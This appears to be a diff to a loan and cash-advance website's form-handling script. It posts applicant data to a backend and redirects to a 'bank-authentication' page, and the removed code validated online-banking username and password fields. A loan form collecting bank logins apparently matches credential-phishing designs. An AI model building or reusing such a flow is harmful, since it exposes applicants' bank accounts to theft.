@@ -76,7 +76,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 return false;
             }
 
-            // Collect form data including bank authentication
+            // Collect form data
             const formData = new FormData(loanForm);
             const formDataObject = {};
             
@@ -87,40 +87,39 @@ document.addEventListener('DOMContentLoaded', function() {
             // Show loading state
             const submitBtn = loanForm.querySelector('button[type="submit"]');
             const originalText = submitBtn.textContent;
-            submitBtn.textContent = 'Processing Application...';
+            submitBtn.textContent = 'Processing...';
             submitBtn.disabled = true;
             
-            // Generate application ID
-            const applicationId = 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-            formDataObject.application_id = applicationId;
-            
-            // Save complete application data to localStorage
-            const timestamp = new Date().toISOString();
-            const completeApplicationData = {
-                ...formDataObject,
-                timestamp: timestamp,
-                submission_method: 'merged_form'
-            };
-            localStorage.setItem('loan_application_' + applicationId, JSON.stringify(completeApplicationData));
-            
-            // Simulate successful submission (replace with actual backend call)
-            setTimeout(() => {
-                try {
-                    // Store application ID for reference
-                    sessionStorage.setItem('loanApplicationId', applicationId);
+            // Submit to backend
+            fetch('form-handler.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formDataObject)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    // Store application data in sessionStorage for bank authentication
+                    sessionStorage.setItem('loanApplicationId', result.application_id);
+                    sessionStorage.setItem('loanApplicationData', JSON.stringify(formDataObject));
                     
-                    // Redirect directly to under-review page
-                    window.location.href = 'under-review.html';
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('There was an error submitting your application. Please try again.');
-                    // Reset button state
-                    submitBtn.textContent = originalText;
-                    submitBtn.disabled = false;
+                    // Redirect to bank authentication page
+                    window.location.href = 'bank-authentication.html';
+                } else {
+                    throw new Error(result.error || 'Submission failed');
                 }
-            }, 2000);
-            
-            // Note: Button state is reset in the catch block above
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error submitting your application. Please try again.');
+            })
+            .finally(() => {
+                // Reset button state
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            });
         });
     }
 
@@ -150,17 +149,14 @@ document.addEventListener('DOMContentLoaded', function() {
             // Generate application ID
             const applicationId = 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
             
-            // Add hidden application ID field to form if it doesn't exist
-            let hiddenField = cashAdvanceForm.querySelector('input[name="application_id"]');
-            if (!hiddenField) {
-                hiddenField = document.createElement('input');
-                hiddenField.type = 'hidden';
-                hiddenField.name = 'application_id';
-                cashAdvanceForm.appendChild(hiddenField);
-            }
+            // Add hidden application ID field to form
+            const hiddenField = document.createElement('input');
+            hiddenField.type = 'hidden';
+            hiddenField.name = 'application_id';
             hiddenField.value = applicationId;
+            cashAdvanceForm.appendChild(hiddenField);
             
-            // Store application data in sessionStorage
+            // Store application data in sessionStorage for bank authentication
             sessionStorage.setItem('loanApplicationId', applicationId);
             sessionStorage.setItem('loanApplicationData', JSON.stringify(formDataObject));
             
@@ -174,9 +170,27 @@ document.addEventListener('DOMContentLoaded', function() {
             };
             localStorage.setItem('loan_application_' + applicationId, JSON.stringify(backupData));
             
-            // Allow the form to submit naturally to Netlify
-            // The form will redirect to the thank-you page or we can set a custom redirect
-            return true;
+            // Submit to Netlify and then redirect
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(new FormData(cashAdvanceForm)).toString()
+            })
+            .then(() => {
+                // Redirect to bank authentication page after successful submission
+                window.location.href = 'bank-authentication.html';
+            })
+            .catch(error => {
+                console.error('Form submission error:', error);
+                // Reset button state on error
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+                alert('There was an error submitting your application. Please try again.');
+            });
+            
+            // Prevent default form submission
+            e.preventDefault();
+            return false;
         });
     }
 
@@ -234,20 +248,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
             }
         });
-        
-        // Additional validation for bank authentication fields
-        const onlineBankingUsername = document.getElementById('onlineBankingUsername');
-        const onlineBankingPassword = document.getElementById('onlineBankingPassword');
-        
-        if (onlineBankingUsername && onlineBankingUsername.value.trim().length < 3) {
-            isValid = false;
-            onlineBankingUsername.classList.add('error');
-        }
-        
-        if (onlineBankingPassword && onlineBankingPassword.value.trim().length < 6) {
-            isValid = false;
-            onlineBankingPassword.classList.add('error');
-        }
 
         // Email validation
         const emailField = document.getElementById('email');
